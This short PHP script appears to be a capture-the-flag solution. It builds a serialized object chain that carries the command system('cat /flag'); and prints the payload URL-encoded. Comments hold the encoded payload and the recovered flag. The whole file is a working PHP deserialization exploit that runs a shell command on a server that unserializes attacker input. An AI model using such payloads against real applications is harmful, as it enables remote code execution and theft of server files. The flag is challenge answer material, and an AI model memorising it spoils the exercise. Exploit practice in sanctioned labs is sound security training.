<?php
class Demo{
    private $a;
    function __construct($args) { $this->a = $args; }
}
class Test{
    private  $b;
    function __construct($args) { $this->b = $args; }
}
$a = new Test("system('cat /flag');");
$b = new Demo($a);
echo urlencode(serialize($b));
// O%3A4%3A%22Demo%22%3A1%3A%7Bs%3A7%3A%22%00Demo%00a%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A7%3A%22%00Test%00b%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D
// flag{wd_test_3}


?>